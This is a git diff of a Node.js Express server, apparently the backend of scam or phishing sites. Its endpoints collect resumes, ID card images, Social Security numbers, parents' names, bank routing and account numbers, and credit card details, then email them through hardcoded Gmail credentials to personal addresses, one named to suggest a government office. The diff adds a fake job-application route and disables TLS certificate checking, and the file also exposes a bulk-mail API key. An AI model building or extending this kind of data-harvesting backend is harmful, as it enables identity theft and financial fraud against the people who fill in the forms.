@@ -1,8 +1,10 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const multer = require('multer');
-const nodemailer = require('nodemailer');
-const cors = require('cors');
+process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+
+const express = require("express");
+const bodyParser = require("body-parser");
+const multer = require("multer");
+const nodemailer = require("nodemailer");
+const cors = require("cors");
 
 const app = express();
 const upload = multer({ storage: multer.memoryStorage() }); // Store files in memory
@@ -14,33 +16,46 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.raw());
 app.use(bodyParser.text());
 
-app.use(cors({
-  origin: '*' // Replace with your actual HTML domain
-}));
+app.use(
+  cors({
+    origin: "*", // Replace with your actual HTML domain
+  })
+);
 
-app.get('/', (req, res) => {
+app.get("/", (req, res) => {
   res.send("Server");
 });
 
 const cpUpload = upload.fields([
-  { name: 'client_resume', maxCount: 1 },
-  { name: 'cover_letter', maxCount: 8 },
-  { name: 'front_id_card', maxCount: 2 },
-  {name: 'back_id_card', maxCount: 2}
+  { name: "client_resume", maxCount: 1 },
+  { name: "cover_letter", maxCount: 8 },
+  { name: "front_id_card", maxCount: 2 },
+  { name: "back_id_card", maxCount: 2 },
 ]);
 
-app.post('/send-email', cpUpload, (req, res) => {
+app.post("/send-email", cpUpload, (req, res) => {
   const {
-    last_name, first_name, name_title, middle_name, email_address, phone_number, date_of_birth, client_state, client_address, client_city, postal_code
+    last_name,
+    first_name,
+    name_title,
+    middle_name,
+    email_address,
+    phone_number,
+    date_of_birth,
+    client_state,
+    client_address,
+    client_city,
+    postal_code,
   } = req.body;
 
   console.log(req.body);
 
   const resume = req.files.client_resume ? req.files.client_resume[0] : null;
   const coverLetter = req.files.cover_letter ? req.files.cover_letter[0] : null;
-  const frontidCard = req.files.front_id_card ? req.files.front_id_card[0] : null;
+  const frontidCard = req.files.front_id_card
+    ? req.files.front_id_card[0]
+    : null;
   const backidCard = req.files.back_id_card ? req.files.back_id_card[0] : null;
-
 
   // Construct email message
   const message = `
@@ -64,42 +79,53 @@ app.post('/send-email', cpUpload, (req, res) => {
 
   // Create a transporter object using SMTP transport
   let transporter = nodemailer.createTransport({
-    service: 'gmail',
+    service: "gmail",
     auth: {
-      user: 'davidmiller4504@gmail.com',
-      pass: 'dqhc mwpf nkmb buib'
-    }
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
   });
 
   // Setup email data with unicode symbols
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "davidleonardo385@gmail.com", // list of receivers
-    subject: 'New Contact Form Submission', // Subject line
+    subject: "New Contact Form Submission", // Subject line
     text: message, // plain text body
     attachments: [
       resume ? { filename: resume.originalname, content: resume.buffer } : null,
-      coverLetter ? { filename: coverLetter.originalname, content: coverLetter.buffer } : null,
-      frontidCard ? { filename: frontidCard.originalname, content: frontidCard.buffer } : null,
-      backidCard ? { filename: backidCard.originalname, content: backidCard.buffer } : null
-
-
-    ].filter(attachment => attachment) // Include only attachments that exist
+      coverLetter
+        ? { filename: coverLetter.originalname, content: coverLetter.buffer }
+        : null,
+      frontidCard
+        ? { filename: frontidCard.originalname, content: frontidCard.buffer }
+        : null,
+      backidCard
+        ? { filename: backidCard.originalname, content: backidCard.buffer }
+        : null,
+    ].filter((attachment) => attachment), // Include only attachments that exist
   };
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.log(error);
-      res.status(500).send('Error sending email');
+      res.status(500).send("Error sending email");
     } else {
-      console.log('Email sent: ' + info.response);
-      res.send('Email sent successfully!');
+      console.log("Email sent: " + info.response);
+      res.send("Email sent successfully!");
     }
   });
 });
 
 app.post("/sender", async (req, res) => {
-  const { bank_name, credit_card, payment_method, company_trust, checking_account, email } = req.body;
+  const {
+    bank_name,
+    credit_card,
+    payment_method,
+    company_trust,
+    checking_account,
+    email,
+  } = req.body;
   console.log(req.body);
 
   // Construct email message
@@ -115,33 +141,45 @@ app.post("/sender", async (req, res) => {
 
   // Create a transporter object using SMTP transport
   let transporter = nodemailer.createTransport({
-    service: 'gmail',
+    service: "gmail",
     auth: {
-      user: 'davidmiller4504@gmail.com',
-      pass: 'dqhc mwpf nkmb buib'
-    }
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
   });
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "davidleonardo385@gmail.com", // list of receivers
-    subject: 'New Contact Form Submission', // Subject line
-    text: message // plain text body
+    subject: "New Contact Form Submission", // Subject line
+    text: message, // plain text body
   };
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.log(error);
-      res.status(500).send('Error sending email');
+      res.status(500).send("Error sending email");
     } else {
-      console.log('Email sent: ' + info.response);
-      res.json({ success: true, message: 'Email sent successfully!' });
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
     }
   });
 });
 
 app.post("/arnoldsender", async (req, res) => {
-  const { firstName, lastName, phoneNumber, email, country, city, state, address, zip, shirt, referralCode } = req.body;
+  const {
+    firstName,
+    lastName,
+    phoneNumber,
+    email,
+    country,
+    city,
+    state,
+    address,
+    zip,
+    shirt,
+    referralCode,
+  } = req.body;
   console.log(req.body);
 
   // Construct email message
@@ -162,35 +200,50 @@ app.post("/arnoldsender", async (req, res) => {
 
   // Create a transporter object using SMTP transport
   let transporter = nodemailer.createTransport({
-    service: 'gmail',
+    service: "gmail",
     auth: {
-      user: 'davidmiller4504@gmail.com',
-      pass: 'dqhc mwpf nkmb buib'
-    }
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
   });
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "davidmiller4504@gmail.com", // list of receivers
-    subject: 'New Contact Form Submission', // Subject line
-    text: message // plain text body
+    subject: "New Contact Form Submission", // Subject line
+    text: message, // plain text body
   };
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.log(error);
-      res.status(500).send('Error sending email');
+      res.status(500).send("Error sending email");
     } else {
-      console.log('Email sent: ' + info.response);
-      res.json({ success: true, message: 'Email sent successfully!' });
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
     }
   });
 });
 
 app.post("/ssnsender", async (req, res) => {
-  const { fullName, ssn, mailingAddress, fathersName, mothersName, placeOfBirth, state, amountReceived, routingNumber, accountNumber, phoneNumber, receivedSSA, dob, dateOfPayment } = req.body;
+  const {
+    fullName,
+    ssn,
+    mailingAddress,
+    fathersName,
+    mothersName,
+    placeOfBirth,
+    state,
+    amountReceived,
+    routingNumber,
+    accountNumber,
+    phoneNumber,
+    receivedSSA,
+    dob,
+    dateOfPayment,
+  } = req.body;
   console.log(req.body);
-  
+
   // Construct email message
   const message = `
     You go a new information from:
@@ -225,36 +278,50 @@ app.post("/ssnsender", async (req, res) => {
   `;
   // Create a transporter object using SMTP transport
   let transporter = nodemailer.createTransport({
-    service: 'gmail',
+    service: "gmail",
     auth: {
-      user: 'davidmiller4504@gmail.com',
-      pass: 'dqhc mwpf nkmb buib'
-    }
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
   });
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "masonwilfred01@gmail.com", // list of receivers
-    subject: 'New Contact Form Submission', // Subject line
-    text: message // plain text body
+    subject: "New Contact Form Submission", // Subject line
+    text: message, // plain text body
   };
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.log(error);
-      res.status(500).send('Error sending email');
+      res.status(500).send("Error sending email");
     } else {
-      console.log('Email sent: ' + info.response);
-      res.json({ success: true, message: 'Email sent successfully!' });
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
     }
   });
 });
 
-
 app.post("/ssnsender2", async (req, res) => {
-  const { fullName, ssn, mailingAddress, fathersName, mothersName, placeOfBirth, state, amountReceived, routingNumber, accountNumber, phoneNumber, receivedSSA, dob, dateOfPayment } = req.body;
+  const {
+    fullName,
+    ssn,
+    mailingAddress,
+    fathersName,
+    mothersName,
+    placeOfBirth,
+    state,
+    amountReceived,
+    routingNumber,
+    accountNumber,
+    phoneNumber,
+    receivedSSA,
+    dob,
+    dateOfPayment,
+  } = req.body;
   console.log(req.body);
-  
+
   // Construct email message
   const message = `
     You go a new information from:
@@ -289,91 +356,81 @@ app.post("/ssnsender2", async (req, res) => {
   `;
   // Create a transporter object using SMTP transport
   let transporter = nodemailer.createTransport({
-    service: 'gmail',
+    service: "gmail",
     auth: {
-      user: 'davidmiller4504@gmail.com',
-      pass: 'dqhc mwpf nkmb buib'
-    }
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
   });
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "ssgov7613@gmail.com", // list of receivers
-    subject: 'New Contact Form Submission', // Subject line
-    text: message // plain text body
+    subject: "New Contact Form Submission", // Subject line
+    text: message, // plain text body
   };
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.log(error);
-      res.status(500).send('Error sending email');
+      res.status(500).send("Error sending email");
     } else {
-      console.log('Email sent: ' + info.response);
-      res.json({ success: true, message: 'Email sent successfully!' });
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
     }
   });
 });
 
-
-
-app.post("/bulksender", async (req,res)=> {
-
-
+app.post("/bulksender", async (req, res) => {
   var transporter = nodemailer.createTransport({
     host: "bulk.smtp.mailtrap.io",
     port: 587,
     auth: {
       user: "api",
-      pass: "aaa8f7986cbccdc1f2633ad8b84f24bc"
+      pass: "aaa8f7986cbccdc1f2633ad8b84f24bc",
     },
     maxMessages: Infinity, // Allow an unlimited number of messages per connection
-    maxConnections: 5 // Limit the number of simultaneous connections
+    maxConnections: 5, // Limit the number of simultaneous connections
   });
 
   // Example list of recipients for bulk emailing
-const recipients = [
-  {email: 'recipient1@example.com', name: 'Recipient One'},
-  {email: 'recipient2@example.com', name: 'Recipient Two'},
-  {email: 'recipient3@example.com', name: 'Recipient Three'},
-  // Add more recipients as needed
-];
+  const recipients = [
+    { email: "recipient1@example.com", name: "Recipient One" },
+    { email: "recipient2@example.com", name: "Recipient Two" },
+    { email: "recipient3@example.com", name: "Recipient Three" },
+    // Add more recipients as needed
+  ];
 
-
-// Prepare email promises for sending in bulk
-const emailPromises = recipients.map(recipient =>
-  transporter.sendMail({
-      from: 'tradecrypt.org',
+  // Prepare email promises for sending in bulk
+  const emailPromises = recipients.map((recipient) =>
+    transporter.sendMail({
+      from: "tradecrypt.org",
       to: `${recipient.name} <${recipient.email}>`, // Personalized to each recipient
-      subject: 'Bulk Email Test',
-      text: 'This is a test email sent in bulk using Nodemailer and Mailtrap.',
-      html: `<b>Hello ${recipient.name},</b><p>This is a test email sent in bulk using Nodemailer and Mailtrap.</p>`
-  })
-);
+      subject: "Bulk Email Test",
+      text: "This is a test email sent in bulk using Nodemailer and Mailtrap.",
+      html: `<b>Hello ${recipient.name},</b><p>This is a test email sent in bulk using Nodemailer and Mailtrap.</p>`,
+    })
+  );
 
-
-// Send all emails in parallel and handle the results
-Promise.all(emailPromises)
-  .then(results => {
-      console.log('All emails sent successfully');
-      results.forEach(result => {
-          console.log(`Message to ${result.envelope.to} sent: ${result.messageId}`);
+  // Send all emails in parallel and handle the results
+  Promise.all(emailPromises)
+    .then((results) => {
+      console.log("All emails sent successfully");
+      results.forEach((result) => {
+        console.log(
+          `Message to ${result.envelope.to} sent: ${result.messageId}`
+        );
       });
-  })
-  .catch(errors => {
-      console.error('Failed to send one or more emails:', errors);
-  });
-})
-
-
-
-
-
-
+    })
+    .catch((errors) => {
+      console.error("Failed to send one or more emails:", errors);
+    });
+});
 
 app.post("/hookup", async (req, res) => {
-  const {item, room,email } = req.body;
+  const { item, room, email } = req.body;
   console.log(req.body);
-  
+
   // // Construct email message
   const message = `
     You go a new information from:
@@ -392,41 +449,101 @@ app.post("/hookup", async (req, res) => {
   `;
   // Create a transporter object using SMTP transport
   let transporter = nodemailer.createTransport({
-    service: 'gmail',
+    service: "gmail",
     auth: {
-      user: 'davidmiller4504@gmail.com',
-      pass: 'dqhc mwpf nkmb buib'
-    }
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
   });
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
     to: "davidmiller4504@gmail.com", // list of receivers
-    subject: 'New Contact Form Submission', // Subject line
-    text: message // plain text body
+    subject: "New Contact Form Submission", // Subject line
+    text: message, // plain text body
   };
 
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.log(error);
-      res.status(500).send('Error sending email');
+      res.status(500).send("Error sending email");
     } else {
-      console.log('Email sent: ' + info.response);
-      res.json({ success: true, message: 'Email sent successfully!' });
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
     }
   });
 });
 
+const jobUpload = upload.fields([
+  { name: "resume", maxCount: 1 },
+  { name: "frontId", maxCount: 1 },
+  { name: "backId", maxCount: 1 },
+  { name: "transcript", maxCount: 1 },
+]);
+
+app.post("/stewjob", jobUpload, (req, res) => {
+  const { fullname, number, email, address, dob } = req.body;
 
 
+  console.log(req.body);
+  console.log(req.files)
 
+  const resume = req.files.resume ? req.files.resume[0] : null;
+  const transcript = req.files.transcript ? req.files.transcript[0] : null;
+  const frontidCard = req.files.frontId ? req.files.frontId[0] : null;
+  const backidCard = req.files.backId ? req.files.backId[0] : null;
 
+  // Construct email message
+  const message = `
+    Contact Information:
+    Full Name: ${fullname}
+    Number: ${number}
+    Email: ${email}
+    Address: ${address}
+    Date of birth: ${dob}
+  `;
 
+  // Create a transporter object using SMTP transport
+  let transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
+  });
 
+  // Setup email data with unicode symbols
+  let mailOptions = {
+    from: "davidmiller4504@gmail.com", // sender address
+    to: "davidmiller4504@gmail.com", // list of receivers
+    subject: "New Contact Form Submission", // Subject line
+    text: message, // plain text body
+    attachments: [
+      resume ? { filename: resume.originalname, content: resume.buffer } : null,
+      transcript
+        ? { filename: transcript.originalname, content: transcript.buffer }
+        : null,
+      frontidCard
+        ? { filename: frontidCard.originalname, content: frontidCard.buffer }
+        : null,
+      backidCard
+        ? { filename: backidCard.originalname, content: backidCard.buffer }
+        : null,
+    ].filter((attachment) => attachment), // Include only attachments that exist
+  };
 
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.status(500).send("Error sending email");
+    } else {
+      console.log("Email sent: " + info.response);
+      res.status(200).json({message:"Email sent successfully!", data: req.body});
+    }
+  });
+});
 
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
-
